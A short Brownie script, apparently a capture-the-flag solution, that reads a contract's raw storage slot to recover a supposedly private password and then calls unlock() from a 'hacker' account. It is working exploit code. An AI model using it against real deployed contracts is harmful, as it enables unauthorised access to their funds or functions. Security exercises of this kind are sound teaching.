from brownie import web3, accounts, config, interface, convert

def main(target):
    hacker = accounts.add(config['wallets']['from_key'])
    vault = interface.VaultInterface(target)
    locked = web3.eth.get_storage_at(target, 0)
    print(f'Locked: {convert.to_bool(locked)}')
    password = web3.eth.get_storage_at(target, 1)
    vault.unlock(password, {'from': hacker})
    locked = web3.eth.get_storage_at(target, 0)
    print(f'Locked: {convert.to_bool(locked)}')


